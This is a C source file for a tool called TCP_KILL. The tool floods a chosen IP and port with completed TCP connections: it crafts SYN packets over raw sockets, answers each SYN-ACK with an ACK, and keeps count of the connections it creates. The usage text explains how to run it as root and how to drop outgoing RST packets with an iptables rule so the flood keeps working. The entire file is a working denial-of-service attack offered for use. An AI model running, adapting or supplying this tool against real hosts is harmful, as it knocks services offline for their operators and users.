/* TCP_KILL
 *
 * Tool that uses raw sockets to flood the target with TCP connections.
 */

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/types.h>
#include <netdb.h>
#include <unistd.h>

#define c_sleep(x) usleep(1000*x)

unsigned short csum(unsigned short *ptr,int nbytes)
{
    long sum;
    unsigned short oddbyte;
    short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}


typedef union __attribute__ ((__packed__))
{
    uint8_t uint8[4];
    uint16_t uint16[2];
    uint32_t uint32;
    struct in_addr in_addr;
}
IP4;

struct __attribute__ ((__packed__)) TCP_PSEUDO_HEADER
{
    uint32_t src;
    uint32_t dst;
    uint8_t  zero;
    uint8_t  prot;
    uint16_t length;
};

struct __attribute__ ((__packed__)) TCP_HEADER
{
    uint16_t src_port;
    uint16_t dst_port;
    uint32_t seq_number;
    uint32_t ack_number;
    uint8_t  stuff[4];
    uint16_t checksum;
    uint16_t urgent_pointer;
    uint8_t data[32];
    uint16_t length;
};


int main(int argc, char *argv[]) {
    if (argc != 5) {
print_usage:
        printf("Tool that uses raw sockets to flood the target with TCP connections\n\
        Usage: %s <dst ip> <dst port> <source ip> <interval (us)>\n\
        EX: %s 192.254.75.98 8000 192.168.2.10 0\n\n\
        NOTE: this uses raw sockets so it must be run as root, you also need to disable kernel RST sending with:\n\
        iptables -A OUTPUT -p tcp --dport 8000 --tcp-flags RST RST -j DROP\n\
        where 8000 is the dst port.\n\n\
        Use:\n\
        iptables -F\n\
        to clear the above iptables rule\n", argv[0], argv[0]);
        return 0;
    }


    IP4 dst_ip, src_ip;
    uint16_t port = strtoul(argv[2], 0, 0);
    unsigned long interval = strtoul(argv[4], 0, 0);
    if (inet_pton(AF_INET, argv[1], &dst_ip.in_addr) != 1)
        goto print_usage;

    if (inet_pton(AF_INET, argv[3], &src_ip.in_addr) != 1)
        goto print_usage;

    char addresstext[32];
    inet_ntop(AF_INET, &dst_ip.in_addr, addresstext, sizeof(addresstext));
    printf("Dest ip: %s:%u\n", addresstext, port);
    inet_ntop(AF_INET, &src_ip.in_addr, addresstext, sizeof(addresstext));
    printf("Src ip: %s\nInterval between packets: %lu (us)\n", addresstext, interval);
    printf("Press Enter to Continue or CTRL-C to cancel\n");
    while( getchar() != '\n' );

    srand(time(0));

    int sock = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0 || fcntl(sock, F_SETFL, O_NONBLOCK, 1) != 0) {
        printf("create sock failed %i\n", sock);
        return 1;
    }

    unsigned long count = 0, cc = 0, data_sent = 0;
    while (1) {
        struct sockaddr_storage addr = {0};
        size_t addrsize;
        struct sockaddr_in *addr4 = (struct sockaddr_in *)&addr;

        addrsize = sizeof(struct sockaddr_in);
        addr4->sin_family = AF_INET;
        addr4->sin_addr = dst_ip.in_addr;
        addr4->sin_port = htons(port);
        struct TCP_PSEUDO_HEADER tcp_ps_header_req;
        struct TCP_HEADER tcp_header_req;
        tcp_ps_header_req.dst = dst_ip.uint32;
        tcp_ps_header_req.src = src_ip.uint32;
        tcp_ps_header_req.zero = 0;
        tcp_ps_header_req.prot = 6;

        tcp_header_req.length = 20;
        tcp_ps_header_req.length = htons(tcp_header_req.length);

        tcp_header_req.src_port = rand();
        tcp_header_req.dst_port = htons(port);
        tcp_header_req.seq_number = rand();
        tcp_header_req.ack_number = 0;
        tcp_header_req.stuff[0] = tcp_header_req.length * 2 * 2;
        tcp_header_req.stuff[1] = 2;
        tcp_header_req.stuff[2] = 0x72;
        tcp_header_req.stuff[3] = 0x10;
        tcp_header_req.checksum = 0;
        tcp_header_req.urgent_pointer = 0;

        struct __attribute__ ((__packed__)) {
            struct TCP_PSEUDO_HEADER tcp_ps_header_req;
            struct TCP_HEADER tcp_header_req;
        }
        TCP_PACKET;
        TCP_PACKET.tcp_ps_header_req = tcp_ps_header_req;
        TCP_PACKET.tcp_header_req = tcp_header_req;
        tcp_header_req.checksum = csum((void *)&TCP_PACKET, sizeof(tcp_ps_header_req) + tcp_header_req.length);

        int ret = sendto(sock, &tcp_header_req, tcp_header_req.length , 0, (struct sockaddr *)&addr, addrsize);
        if (ret > 0)
            data_sent += ret;

        while (1) {
            struct sockaddr_storage r_addr;
            socklen_t addrlen = sizeof(r_addr);
            uint8_t data[128] = {0};
            int fail_or_len = recvfrom(sock, (char *) data, sizeof(data), 0, (struct sockaddr *)&r_addr, &addrlen);
            if (fail_or_len < 0)
                break;

            if (fail_or_len < 38 || data[0] != 0x45)
                continue;

            uint32_t ip_cmp;
            memcpy(&ip_cmp, data + 12, 4);
            if (ip_cmp != dst_ip.uint32)
                continue;

            uint32_t port_cmp;
            memcpy(&port_cmp, data + 20, 2);
            if (port_cmp != htons(port))
                continue;

            if (data[33] != 0x12) {
                //printf("%u\n", data[33]);
                continue;
            }

            memcpy(&tcp_header_req.src_port, data + 22, 2);
            memcpy(&tcp_header_req.ack_number, data + 24, 4);
            memcpy(&tcp_header_req.seq_number, data + 28, 4);
            tcp_header_req.ack_number = htonl(ntohl(tcp_header_req.ack_number) + 1);

            tcp_header_req.stuff[1] = 0x10;
            tcp_header_req.checksum = 0;
            TCP_PACKET.tcp_ps_header_req = tcp_ps_header_req;
            TCP_PACKET.tcp_header_req = tcp_header_req;
            tcp_header_req.checksum = csum((void *)&TCP_PACKET, sizeof(tcp_ps_header_req) + tcp_header_req.length);
            ret = sendto(sock, &tcp_header_req, tcp_header_req.length , 0, (struct sockaddr *)&addr, addrsize);
            if (ret == tcp_header_req.length) {
                data_sent += ret;
                ++count;
            }
        }

        if (interval > 1000000 || cc > (1000000 / (interval + 1))) {
            printf("connections created: %lu total data sent: %lu bytes\n", count, data_sent);
            cc = 0;
        }

        if (interval)
            usleep(interval);

        ++cc;
    }
}
